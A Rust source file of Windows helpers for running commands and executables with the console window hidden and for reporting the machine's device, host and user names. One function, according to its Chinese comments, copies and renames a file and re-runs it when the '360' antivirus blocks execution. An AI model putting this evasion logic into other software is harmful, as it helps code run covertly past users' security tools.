use bytes::BufMut;
use encoding_rs::GBK;
use std::ffi::OsStr;
use std::iter::once;
use std::os::windows::ffi::OsStrExt;
use std::os::windows::process::CommandExt;
use std::path::{Path, PathBuf};
use std::process;
use std::process::Stdio;
use std::ptr::null_mut;
use std::string::FromUtf8Error;
use anyhow::anyhow;
use tokio::process::Command;

use winapi::um::processthreadsapi::STARTUPINFOW;
use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION};
use common::file_util;

pub fn whoami() -> String {
    format!(
        "{}\\{}\\{}",
        whoami::devicename(),
        whoami::hostname(),
        whoami::username()
    )
}

pub async fn cmd_exec(
    cmd_args: Vec<String>,
    open_window: bool,
    gbk: bool,
) -> anyhow::Result<String> {
    let mut command = Command::new(cmd_args[0].as_str());

    let mut c;
    if open_window {
        c = &mut command;
    } else {
        c = command.creation_flags(0x08000000)
    }
    if cmd_args.len() > 1 {
        for i in 1..cmd_args.len() {
            c = c.arg(cmd_args[i].as_str());
        }
    }

    let child = c
        //如 java -version 就会发送数据到 stderr 流
        .stderr(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()?;
    let output = child.wait_with_output().await?;
    Ok(format!(
        "{}{}",
        try_decode(&output.stdout, gbk),
        try_decode(&output.stderr, gbk)
    ))
}

pub async fn cmd_exec_line(
    cmd_line: &str,
    open_window: bool,
    gbk: bool,
) -> anyhow::Result<String> {

    let mut cmd = Command::new("cmd.exe");

    let mut command = if open_window {
        &mut cmd
    } else {
        cmd.creation_flags(0x08000000)
    };

    command.arg("/C").arg(cmd_line);

    let child = command
        .stderr(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()?;
    let output = child.wait_with_output().await?;

    Ok(format!(
        "{}{}",
        try_decode(&output.stdout, gbk),
        try_decode(&output.stderr, gbk)
    ))
}

fn try_decode(bys: &[u8], gbk: bool) -> String {
    if gbk {
        //                  enc:实际使用编码格式,err:是否存在因格式错误而被替换的序列
        let (res, enc, err) = GBK.decode(bys);
        if err {
            format!("GBK解码失败！utf-8: {}", String::from_utf8_lossy(bys))
        } else {
            res.to_string()
        }
    } else {
        match String::from_utf8(bys.to_vec()) {
            Ok(s) => s,
            Err(_) => {
                format!("Utf-8解码失败！gbk: {}", GBK.decode(bys).0.to_string())
            }
        }
    }
}

//执行一个文件且不等待输出
pub fn cmd_exec_file<P: AsRef<Path>>(path: P) -> anyhow::Result<()> {
    use std::os::windows::process::CommandExt;
    let mut command = std::process::Command::new(path.as_ref().as_os_str());
    let _ = command
        .creation_flags(0x08000000)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    // if cmd_args.len() > 1 {
    //     for i in 1..cmd_args.len() {
    //         c = c.arg(cmd_args[i].as_str());
    //     }
    // }
    Ok(())
}

//执行不成功基本都是被360搞了，此时换个方式执行
//注意即使返回ok，winapi在执行其的时候看似执行成功，但这里执行的目标文件若非  #![windows_subsystem = "windows"]  的，实际上不会执行成功。
//todo 添加获取到的参数
pub fn win_exec_any_file(path: &OsStr) -> anyhow::Result<()> {
    let path_wide: Vec<u16> = path
        .encode_wide()
        .chain(once(0))
        .collect();
    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let success = unsafe {
        CreateProcessW(
            null_mut(),
            path_wide.as_ptr() as *mut _,
            null_mut(),
            null_mut(),
            false as i32,
            0,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        )
    };

    if success == 0 {
        match file_util::copy_and_rename(&PathBuf::from(path)) {
            Ok(new_path) => {
                match cmd_exec_file(new_path.clone()) {
                    Ok(_) => {}
                    Err(e) => {
                        return Err(anyhow!("winapi失败后，使用cmd执行文件{:?}也失败,{}",new_path,e));
                    }
                }
            }
            Err(e) => {
                return Err(anyhow!("winapi失败后，copy_and_rename失败,{}",e));
            }
        }
    }

    // 如果想要父进程等待子进程结束,不知道为什么没起作用
    // unsafe {
    //     winapi::um::synchapi::WaitForSingleObject(pi.hProcess, winapi::um::winbase::INFINITE);
    //     winapi::um::handleapi::CloseHandle(pi.hProcess);
    //     winapi::um::handleapi::CloseHandle(pi.hThread);
    // }
    Ok(())
}

#[tokio::test]
pub async fn test() {
    println!(
        "输出:||{}||",
        cmd_exec(
            vec!["java".to_string(), "-version".to_string()],
            false,
            true
        )
        .await
        .unwrap()
    );
    println!(
        "line输出:||{}||",
        cmd_exec_line(
            " echo   %USERPROFILE%",
            false,
            true
        )
            .await
            .unwrap()
    );
    let v = "高手高手".as_bytes();

    let (x, y, z) = GBK.decode(v);
    println!("{}", x);
    println!("{:?}", y);
    println!("{}", z);
    // println!("{}", cmd_exec(vec!["ipconfig".to_string()],false).unwrap());
}
